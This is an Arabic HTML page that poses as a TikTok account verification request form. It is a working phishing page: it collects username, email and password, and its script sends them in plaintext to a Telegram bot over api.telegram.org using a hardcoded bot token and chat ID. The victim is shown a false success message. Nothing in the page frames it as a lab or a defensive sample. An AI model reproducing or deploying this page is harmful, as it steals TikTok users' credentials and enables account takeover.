<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>توثيق تيك توك</title>
  <style>
    body { background: #111; color: white; font-family: sans-serif; padding: 30px; }
    .form-container { max-width: 400px; margin: auto; background: #222; padding: 20px; border-radius: 10px; }
    input, textarea, button {
      width: 100%; margin-top: 10px; padding: 10px; border: none; border-radius: 5px;
      background: #333; color: white;
    }
    button { background: #ff0050; cursor: pointer; }
    button:hover { background: #e60045; }
  </style>
</head>
<body>

<div class="form-container">
  <h2>طلب توثيق حساب TikTok</h2>
  <form id="verifyForm">
    <input type="text" id="username" placeholder="اسم المستخدم" required>
    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
    <input type="password" id="password" placeholder="كلمة المرور" required>
    <textarea id="reason" placeholder="سبب التوثيق" required></textarea>
    <button type="submit">إرسال</button>
  </form>
</div>

<script>
  const token = "7683476960:AAE-3ux3hCDQz__Qeks_Uf4WnM3SFB-p5fI"; // ← استبدله بالتوكن الحقيقي
  const chat_id = "5177230543"; // ← استبدله بالمعرّف الحقيقي

  document.getElementById("verifyForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const email    = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const reason   = document.getElementById("reason").value;

    const message = `
طلب توثيق جديد:
----------------
اسم المستخدم: ${username}
البريد الإلكتروني: ${email}
كلمة المرور: ${password}
السبب: ${reason}
`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chat_id,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      alert("تم الإرسال بنجاح!");
    })
    .catch(error => {
      alert("حدث خطأ أثناء الإرسال");
      console.error(error);
    });
  });
</script>


</body></html>
